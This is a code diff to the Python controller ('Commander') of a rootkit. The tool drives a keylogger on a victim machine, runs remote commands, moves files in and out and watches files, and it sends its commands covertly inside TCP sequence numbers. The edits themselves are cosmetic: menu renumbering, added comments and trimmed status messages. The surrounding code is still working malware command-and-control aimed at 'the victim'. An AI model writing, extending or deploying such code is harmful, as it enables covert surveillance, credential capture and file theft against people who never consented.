@@ -35,18 +35,18 @@ class Commander:
         }
         
         self.connected_actions = {
-        "1": self.handle_start_keylogger,
-        "2": self.handle_stop_keylogger,
-        "3": self.handle_get_log,
-        "4": self.handle_exec,
-        "5": self.handle_put_file,
-        "6": self.handle_get_file,
-        "7": self.handle_watch,
-        "8": self.handle_stop_watch,      # ADD THIS
-        "9": self.handle_uninstall,
-        "10": self.handle_disconnect,     # Change from 9 to 10
-        "0": self.handle_exit
-    }
+            "1": self.handle_start_keylogger,
+            "2": self.handle_stop_keylogger,
+            "3": self.handle_get_log,
+            "4": self.handle_exec,
+            "5": self.handle_put_file,
+            "6": self.handle_get_file,
+            "7": self.handle_watch,
+            "8": self.handle_stop_watch,
+            "9": self.handle_uninstall,
+            "10": self.handle_disconnect,
+            "0": self.handle_exit
+        }
 
     def send_covert_command(self, cmd_type, data=""):
         """Encodes ASCII characters into the TCP Sequence Number."""
@@ -112,26 +112,30 @@ class Commander:
                     char = chr(char_code)
                     
                     with self.output_lock:
+                        # ALWAYS add to watch buffer first (to detect markers)
                         self.watch_buffer += char
                         
-                        # Detect watch file markers
+                        # Check for watch file START marker
                         if "[WATCH FILE]" in self.watch_buffer and not self.watch_receiving:
                             self.watch_receiving = True
                             match = re.search(r'\[WATCH FILE\] (.+?)\n', self.watch_buffer)
                             if match:
                                 self.watch_current_file = match.group(1).strip()
                         
+                        # Check for SIZE marker
                         if "[SIZE]" in self.watch_buffer and self.watch_current_file:
                             match = re.search(r'\[SIZE\] (\d+)\n', self.watch_buffer)
                             if match:
                                 self.watch_file_size = int(match.group(1))
                         
+                        # Check for END marker - save and clear
                         if "[WATCH END]" in self.watch_buffer and self.watch_receiving:
                             self._save_watched_file()
                             self.watch_receiving = False
                             self.watch_current_file = None
                             self.watch_buffer = ""
                         else:
+                            # Only add to output buffer if NOT receiving watch data
                             if not self.watch_receiving:
                                 self.output_buffer += char
 
@@ -165,7 +169,6 @@ class Commander:
             with open(save_path, "w") as f:
                 f.write(content)
             print(f"\n[+] Watched file saved: {save_path}")
-            print(f"[+] File size: {self.watch_file_size} bytes")
         except Exception as e:
             print(f"\n[!] Error saving watched file: {e}")
 
@@ -343,9 +346,7 @@ class Commander:
         
         os.makedirs("./watched", exist_ok=True)
         
-        print(f"[*] Watching {path} on victim...")
-        print(f"[*] Changes will be saved to ./watched/")
-        print(f"[*] Press Ctrl+C to stop watching")
+        print(f"[*] Watching {path}")
         self.send_covert_command("WATCH", path)
         time.sleep(0.5)
 
@@ -357,7 +358,7 @@ class Commander:
         print("[+] Stop watch signal sent.")
 
     def handle_uninstall(self):
-        """Option 8: Uninstall rootkit from the victim."""
+        """Option 9: Uninstall rootkit from the victim."""
         confirm = input("Are you sure you want to uninstall? (y/n): ").strip().lower()
         if confirm == 'y':
             print("[*] Uninstalling rootkit from victim...")
@@ -368,7 +369,7 @@ class Commander:
             print("[!] Uninstall cancelled.")
 
     def handle_disconnect(self):
-        """Option 9: Disconnect from the victim."""
+        """Option 10: Disconnect from the victim."""
         print("[*] Disconnecting from victim...")
         self.send_covert_command("EXIT")
         self.is_connected = False
